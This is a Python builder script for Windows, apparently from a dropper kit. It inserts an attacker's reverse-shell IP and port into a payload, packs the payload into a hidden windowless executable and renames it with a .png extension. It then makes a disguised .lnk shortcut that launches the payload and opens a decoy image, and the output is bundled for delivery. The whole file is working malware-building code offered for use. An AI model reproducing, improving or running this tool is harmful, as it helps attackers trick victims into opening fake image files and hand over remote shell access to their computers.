import subprocess
import argparse
import shutil
import os
import ctypes
from win32com.client import Dispatch
import zipfile
from PIL import Image

def set_ip_and_port_in_shellcode(ip, port):
    file_path = 'shellcode.py'
    # Open the file and read all the contents
    with open(file_path, 'r') as file:
        content = file.read()

    # Replace all occurrences of old_string with new_string
    old_string = "RHOST='';RPORT=4242"
    new_string = "RHOST='"+ip+"';RPORT="+port
    updated_content = content.replace(old_string, new_string)

    # Open the file in write mode to overwrite the content
    with open(file_path, 'w') as file:
        file.write(updated_content)

    print(f"Replaced Ip & port in shellcode.")
    
    
def set_default_shellcode(ip, port):
    file_path = 'shellcode.py'
    # Open the file and read all the contents
    with open(file_path, 'r') as file:
        content = file.read()

    # Replace all occurrences of old_string with new_string
    old_string = "RHOST='"+ip+"';RPORT="+port
    new_string = "RHOST='';RPORT=4242"
    updated_content = content.replace(old_string, new_string)

    # Open the file in write mode to overwrite the content
    with open(file_path, 'w') as file:
        file.write(updated_content)

    print(f"Replaced Ip & port in shellcode.")
    
    
    
def clean_directory(keep_files):
    try:
        # Get the current directory
        current_dir = os.getcwd()

        # Iterate over all files and folders in the current directory
        for item in os.listdir(current_dir):
            item_path = os.path.join(current_dir, item)

            # Skip the files to keep
            if item in keep_files:
                print(f"Skipping: {item}")
                continue

            # Remove files and folders
            if os.path.isfile(item_path) or os.path.islink(item_path):
                print(f"Deleting file: {item}")
                os.remove(item_path)
            elif os.path.isdir(item_path):
                print(f"Deleting folder: {item}")
                shutil.rmtree(item_path)

        print("Cleanup completed.")
    except Exception as e:
        print(f"An error occurred during cleanup: {e}")
        
        
        
def convert_shellcode_to_exe(python_script):
    try:
        icon_path = "icon.ico"
        # Check if the icon file exists
        if not os.path.isfile(icon_path):
            print(f"Error: Icon file '{icon_path}' not found.")
    
        # Run PyInstaller to convert the script to an executable
        subprocess.run([
            'pyinstaller',
            '--onefile',  # Package everything into a single executable
            '--windowed',  # Use this if you don't want a console window (for GUI apps)
            '--hide-console', 'hide-early',
            '--distpath', '.',  # Save the .exe in the current folder
            '--noconfirm',  # Overwrite output directory without confirmation
            '--clean',  # Clean temporary files and avoid creating a build folder
            '--workpath', '.\\temp',
            # '--icon', icon_path,
            python_script
        ], check=True)
        print(f"Successfully converted {python_script} to an executable.")
        
        
    except subprocess.CalledProcessError as e:
        print(f"Failed to convert {python_script} to an executable: {e}")
    except FileNotFoundError:
        print("PyInstaller is not installed. Please install it using 'pip install pyinstaller'.")


def convert_exe_to_png(python_script, output_name):
    # Rename the generated .exe file
    script_name = os.path.splitext(os.path.basename(python_script))[0]  # Get script name without extension
    old_exe_name = f"{script_name}.exe"  # Original .exe name
    new_exe_name = f"{output_name}.png"  # New .exe name
    if os.path.exists(old_exe_name):
        os.rename(old_exe_name, new_exe_name)
        print(f"Renamed {old_exe_name} to {new_exe_name}.")
    else:
        print(f"Error: {old_exe_name} not found in the current folder.")
            

def set_file_hidden(file_path):
    try:
        # Check if the file exists
        if not os.path.exists(file_path):
            print(f"Error: The file {file_path} does not exist.")
            return

        # Set the file attribute to hidden
        FILE_ATTRIBUTE_HIDDEN = 0x02
        ctypes.windll.kernel32.SetFileAttributesW(file_path, FILE_ATTRIBUTE_HIDDEN)
        print(f"File {file_path} is now hidden.")
    except Exception as e:
        print(f"Failed to set file as hidden: {e}")
        
        
    
def create_shortcut(target_path, shortcut_name, shellcode_name, image_name):
    try:
        # Ensure the target path is absolute
        target_path = os.path.abspath(target_path)

        # Determine the shortcut path (same folder as the target)
        shortcut_folder = os.path.dirname(target_path)
        shortcut_path = os.path.join(shortcut_folder, f"{shortcut_name}.lnk")

        # Create the shortcut
        shell = Dispatch('WScript.Shell')
        shortcut = shell.CreateShortCut(shortcut_path)
        manipulate_target_path = "C:\Windows\System32\cmd.exe /c "+target_path+" && "+image_name
        print(manipulate_target_path)
        shortcut.Targetpath = r'C:\Windows\System32\cmd.exe'
        shortcut.Arguments = '/c start /min '+shellcode_name+" && "+image_name
        
        # Set the icon if provided

        icon_path = os.path.join(os.environ['SystemRoot'], 'System32', 'shell32.dll')
        icon_index = 313
        shortcut.IconLocation = f"{icon_path},{icon_index}"
            
        shortcut.save()
        

    
        print(f"Shortcut created at: {shortcut_path}")
    except Exception as e:
        print(f"Failed to create shortcut: {e}")
        


def zip_files(file1, file2):
    try:
        # Create a new zip file
        with zipfile.ZipFile('build.zip', 'w') as zipf:
            # Add the first file to the zip archive
            zipf.write(file1, arcname=os.path.basename(file1))
            # Add the second file to the zip archive
            zipf.write(file2, arcname=os.path.basename(file2))
        
        print(f"Files {file1} and {file2} have been zipped into build.zip")
    except Exception as e:
        print(f"Failed to create zip file: {e}")


def create_build_folder_and_move_files(files_to_move):
    folder_name = 'build'
    try:
        # Create the folder if it doesn't exist
        if not os.path.exists(folder_name):
            os.makedirs(folder_name)
            print(f"Folder '{folder_name}' created.")

        # Move each file to the folder
        for file in files_to_move:
            if os.path.exists(file):
                shutil.move(file, os.path.join(folder_name, file))
                print(f"Moved '{file}' to '{folder_name}'.")
            else:
                print(f"File '{file}' does not exist.")

        print("Operation completed.")
    except Exception as e:
        print(f"An error occurred: {e}")
        
def save_image(image_path):
    if os.path.exists(image_path):
        print(image_path)
        try:
            save_directory = r'build'
            # Open the image using Pillow
            img = Image.open(image_path)
            image_name = os.path.basename(image_path)
            # Combine the save directory with the image filename to get the full save path
            save_path = os.path.join(save_directory, image_name)
            # Save the image to the specified directory
            img.save(save_path)
            print(f"Image has been saved to {save_path}")
            # Hide the saved file by changing its attributes
            os.system(f'attrib +h "{save_path}"')
            print(f"The file {save_path} has been hidden.")
        except Exception as e:
            print(f"Error: {e}")
    else:
        print(f"Error: The file {image_path} does not exist.")
    
    
if __name__ == "__main__":
    # Set up argument parsing
    parser = argparse.ArgumentParser(description="Hello.")
    parser.add_argument('-rip', '--reverse-ip', required=True, help="reverse ip.")
    parser.add_argument('-rport', '--reverse-port', required=True, help="reverse port.")
    parser.add_argument('-img', '--image-path', required=True, help="image path.")
    parser.add_argument('-s', '--shellcode', default='shellcode.py', help="Shellcode file (e.g., shellcode.py).")
    parser.add_argument('-sn', '--shellcode-name', default='img-shell', help="The name of the output .exe file (default: img-tmp).")
    parser.add_argument('-pn', '--picture-name', default='img', help="The name of the picture file (default: img).")
    
    # Parse arguments
    args = parser.parse_args()
    
    clean_directory(['image_icon.ico', 'main.py', 'req.txt', 'shellcode.py'])
    
    image_name = os.path.basename(args.image_path)
    # prepair shellcode
    set_ip_and_port_in_shellcode(args.reverse_ip, args.reverse_port)
    # Call the conversion function
    convert_shellcode_to_exe(args.shellcode)
    # Convert exe to png
    convert_exe_to_png(args.shellcode, args.shellcode_name)
    #create .lnk file
    create_shortcut(args.shellcode, args.picture_name+'.png', args.shellcode_name+'.png', image_name)
    #hidden img shellcode
    set_file_hidden(args.shellcode_name+'.png')
    # buid
    create_build_folder_and_move_files([args.shellcode_name+'.png', args.picture_name+'.png.lnk'])
    # add main image
    save_image(args.image_path)
    # set default shellcode
    set_default_shellcode(args.reverse_ip, args.reverse_port)
    # clear temp files
    clean_directory(['image_icon.ico', 'main.py', 'req.txt', 'shellcode.py', 'build'])
    
    
    
    
    
    
    
    
    
# pyinstaller --onefile --distpath --noconfirm --clean --workpath .\\temp --icon image_icon.ico
    